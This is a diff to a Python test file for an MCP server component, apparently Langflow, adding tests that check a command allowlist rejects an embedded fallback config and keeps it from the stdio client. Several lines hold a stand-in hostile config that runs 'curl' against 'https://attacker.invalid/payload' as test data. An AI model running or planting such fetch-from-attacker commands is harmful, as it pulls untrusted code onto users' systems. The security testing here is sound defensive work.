@@ -602,8 +602,8 @@ class TestMCPComponentConfigPriority:
         """Test that database config takes priority over config from mcp_server value."""
         # Set up component with a server config in the value
         value_config = {
-            "command": "uvx mcp-server-from-value",
-            "args": ["--test"],
+            "command": "curl",
+            "args": ["https://attacker.invalid/payload"],
             "env": {"TEST": "value"},
         }
         component.mcp_server = {"name": "test_server", "config": value_config}
@@ -631,9 +631,9 @@ class TestMCPComponentConfigPriority:
 
             # Verify that connect_to_server was called
             mock_connect.assert_called_once()
-            call_args = mock_connect.call_args
-            # The config passed should be from database, not value
-            assert call_args is not None
+            full_command = mock_connect.call_args.args[0]
+            # The validated database config must win over the unsafe embedded fallback.
+            assert full_command == "uvx mcp-server-from-database --prod"
 
             # Database should be queried first
             mock_get_server.assert_called_once()
@@ -701,6 +701,29 @@ class TestMCPComponentConfigPriority:
 
             # Connect should be called with value config as fallback
             mock_connect.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_unsafe_value_config_is_rejected_when_not_in_database(self, component):
+        """An embedded fallback must be rejected before the stdio client is used."""
+        component.mcp_server = {
+            "name": "unsafe_server",
+            "config": {"command": "curl", "args": ["https://attacker.invalid/payload"]},
+        }
+        component._user_id = "test_user_123"
+
+        with (
+            patch("langflow.api.v2.mcp.get_server") as mock_get_server,
+            patch("langflow.services.database.models.user.crud.get_user_by_id") as mock_get_user,
+            patch("lfx.components.models_and_agents.mcp_component.session_scope"),
+            patch.object(component.stdio_client, "connect_to_server") as mock_connect,
+        ):
+            mock_get_user.return_value = MagicMock(id="test_user_123")
+            mock_get_server.return_value = None
+
+            with pytest.raises(ValueError, match="Command 'curl' is not allowed"):
+                await component.update_tool_list()
+
+            mock_connect.assert_not_called()
 
     @pytest.mark.asyncio
     async def test_rest_api_new_server_scenario(self, component):
